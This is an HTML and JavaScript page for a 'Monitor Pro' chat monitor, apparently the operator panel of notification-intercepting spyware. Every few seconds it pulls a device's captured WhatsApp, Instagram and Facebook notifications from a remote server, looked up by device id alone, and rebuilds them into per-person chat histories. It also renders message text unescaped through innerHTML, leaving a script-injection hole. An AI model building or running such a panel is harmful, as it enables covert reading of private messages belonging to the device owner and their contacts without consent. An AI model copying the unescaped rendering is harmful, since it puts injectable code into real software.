<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Chat Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --card-bg: #161616;
            --text-white: #ffffff;
            --text-grey: #a0a0a0;
            --border-color: #333;
            --accent: #00A884; /* WhatsApp Green */
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }

        body {
            background-color: var(--bg-color);
            color: var(--text-white);
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            overflow: hidden;
        }

        .mobile-container {
            width: 100%;
            max-width: 600px;
            background-color: #0a0a0a;
            height: 100%;
            display: flex;
            flex-direction: column;
            border-left: 1px solid var(--border-color);
            border-right: 1px solid var(--border-color);
        }

        /* --- Header --- */
        .header {
            padding: 15px;
            background-color: rgba(20, 20, 20, 0.95);
            border-bottom: 1px solid var(--border-color);
            z-index: 10;
        }

        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .title { font-size: 20px; font-weight: 700; display: flex; align-items: center; gap: 10px; }

        /* Chips */
        .filters-scroll { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none; }
        .chip {
            background: #222; border: 1px solid #444; color: #ccc;
            padding: 6px 16px; border-radius: 20px; font-size: 13px; cursor: pointer; white-space: nowrap;
        }
        .chip.active { background: var(--text-white); color: #000; border-color: #fff; font-weight: 600; }

        /* --- List Area --- */
        .list-area { flex: 1; overflow-y: auto; padding: 15px; padding-bottom: 80px; }
        
        /* --- Card Design --- */
        .notif-card {
            background-color: var(--card-bg);
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 10px;
            display: flex; align-items: center; gap: 12px;
            cursor: pointer; transition: 0.2s;
        }
        .notif-card:active { transform: scale(0.98); background: #222; }

        .avatar {
            width: 45px; height: 45px; border-radius: 50%;
            background: #333; display: flex; justify-content: center; align-items: center;
            font-size: 18px; color: #fff; flex-shrink: 0;
        }
        .avatar.wa { background: #00A884; }
        .avatar.insta { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        .avatar.fb { background: #1877F2; }

        .content { flex: 1; overflow: hidden; }
        .row-top { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .name { font-weight: 600; font-size: 16px; color: #fff; }
        .time { font-size: 11px; color: #777; }
        .preview { font-size: 13px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        .badge {
            background: var(--accent); color: #000; font-size: 10px; font-weight: bold;
            padding: 2px 6px; border-radius: 10px; margin-left: 5px;
        }

        /* --- FULL SCREEN CHAT (WhatsApp Style) --- */
        .chat-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #0b141a; z-index: 100; display: none;
            flex-direction: column;
            animation: slideIn 0.2s ease-out;
        }
        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }

        .chat-header {
            padding: 10px 15px; background: #202c33; display: flex; align-items: center; gap: 15px;
            border-bottom: 1px solid #333; height: 60px;
        }
        .chat-back { font-size: 20px; color: #fff; cursor: pointer; }
        .chat-name { font-size: 18px; font-weight: 600; color: #fff; }
        
        .chat-body {
            flex: 1; overflow-y: auto; padding: 15px;
            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); /* WhatsApp Dark BG */
            background-size: cover;
            display: flex; flex-direction: column; gap: 8px;
        }

        .bubble {
            max-width: 80%; padding: 8px 10px; border-radius: 8px;
            font-size: 14px; line-height: 1.4; color: #e9edef;
            position: relative; align-self: flex-start;
            background: #202c33; box-shadow: 0 1px 1px rgba(0,0,0,0.2);
        }
        .bubble-time {
            font-size: 10px; color: #8696a0; text-align: right; display: block; margin-top: 4px;
        }

    </style>
</head>
<body>

    <div class="mobile-container">
        
        <div class="header">
            <div class="header-top">
                <div class="title"><i class="fas fa-eye"></i> Monitor Pro</div>
                <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer; color:var(--accent);"></i>
            </div>
            <div class="filters-scroll">
                <div class="chip active" onclick="setFilter('all', this)">All (Raw)</div>
                <div class="chip" onclick="setFilter('whatsapp', this)">WhatsApp (Chat)</div>
                <div class="chip" onclick="setFilter('instagram', this)">Instagram</div>
            </div>
        </div>

        <div class="list-area" id="mainList">
            <div style="text-align:center; margin-top:50px; color:#555;">Loading...</div>
        </div>

    </div>

    <div class="chat-screen" id="chatView">
        <div class="chat-header">
            <i class="fas fa-arrow-left chat-back" onclick="closeChat()"></i>
            <div class="avatar wa" style="width:35px; height:35px; font-size:14px;"><i class="fab fa-whatsapp"></i></div>
            <div class="chat-name" id="chatTitle">Name</div>
        </div>
        <div class="chat-body" id="chatContent">
            </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;

        let allData = [];
        let currentFilter = 'all';

        async function fetchData() {
            if(!deviceId) return;
            try {
                const res = await fetch(API_URL);
                const rawData = await res.json();
                // Sort Newest First
                allData = rawData.sort((a, b) => b.postTime - a.postTime);
                renderUI();
            } catch (e) { console.error(e); }
        }

        function renderUI() {
            const container = document.getElementById('mainList');
            container.innerHTML = "";

            // --- LOGIC 1: WHATSAPP TAB (GROUPED) ---
            if (currentFilter === 'whatsapp') {
                
                // 1. WhatsApp ka data nikalo
                const waData = allData.filter(d => (d.packageName||"").includes('whatsapp'));
                
                // 2. Group banao Name ke hisaab se
                const groups = {};
                waData.forEach(msg => {
                    const name = msg.title || "Unknown";
                    if (!groups[name]) groups[name] = [];
                    groups[name].push(msg);
                });

                // 3. Har Group (Person) ka ek Card banao
                Object.keys(groups).forEach(name => {
                    const messages = groups[name]; // Saare messages is bande ke
                    const latestMsg = messages[0]; // Sabse naya message
                    
                    const card = createCard(latestMsg, true, messages.length);
                    
                    // Click karne par CHAT history khulegi
                    card.onclick = () => openChat(name, messages);
                    container.appendChild(card);
                });

                if(waData.length === 0) container.innerHTML = "<div style='text-align:center; color:#555; margin-top:20px;'>No WhatsApp chats found.</div>";

            } 
            // --- LOGIC 2: ALL TAB (SINGLE / RAW) ---
            else {
                let data = allData;
                if (currentFilter !== 'all') {
                    data = allData.filter(d => (d.appName||"").toLowerCase().includes(currentFilter));
                }

                data.forEach(item => {
                    // Yahan Grouping nahi hogi. Sab line se aayega.
                    const card = createCard(item, false);
                    container.appendChild(card);
                });
            }
        }

        function createCard(item, isGrouped, count = 0) {
            const div = document.createElement('div');
            div.className = 'notif-card';
            
            let iconClass = 'fas fa-bell';
            let iconBg = 'class="avatar"';
            const pkg = (item.packageName || "").toLowerCase();
            
            if (pkg.includes('whatsapp')) { iconClass = 'fab fa-whatsapp'; iconBg = 'class="avatar wa"'; }
            else if (pkg.includes('instagram')) { iconClass = 'fab fa-instagram'; iconBg = 'class="avatar insta"'; }
            else if (pkg.includes('facebook')) { iconClass = 'fab fa-facebook-f'; iconBg = 'class="avatar fb"'; }

            const timeStr = new Date(parseInt(item.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            
            // Badge sirf tab dikhega jab Grouped view ho (WhatsApp tab)
            const badgeHtml = (isGrouped && count > 1) ? `<span class="badge">${count}</span>` : '';

            div.innerHTML = `
                <div ${iconBg}><i class="${iconClass}"></i></div>
                <div class="content">
                    <div class="row-top">
                        <span class="name">${item.title} ${badgeHtml}</span>
                        <span class="time">${timeStr}</span>
                    </div>
                    <div class="preview">${item.text}</div>
                </div>
            `;
            return div;
        }

        // --- REAL CHAT VIEW FUNCTION ---
        function openChat(name, messages) {
            const screen = document.getElementById('chatView');
            const body = document.getElementById('chatContent');
            document.getElementById('chatTitle').innerText = name;
            
            body.innerHTML = ""; // Purana saaf karo

            // Messages array newest pehle hai, hume chat me oldest upar chahiye
            // Isliye reverse karenge display ke liye
            const chatHistory = [...messages].reverse();

            chatHistory.forEach(msg => {
                const div = document.createElement('div');
                div.className = 'bubble';
                const t = new Date(parseInt(msg.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
                div.innerHTML = `${msg.text} <span class="bubble-time">${t}</span>`;
                body.appendChild(div);
            });

            screen.style.display = 'flex';
            // Scroll to bottom (latest message)
            setTimeout(() => { body.scrollTop = body.scrollHeight; }, 100);
        }

        function closeChat() {
            document.getElementById('chatView').style.display = 'none';
        }

        function setFilter(type, btn) {
            currentFilter = type;
            document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
            btn.classList.add('active');
            renderUI();
        }

        fetchData();
        setInterval(fetchData, 4000); // Har 4 second me auto update

    </script>
</body>
</html>
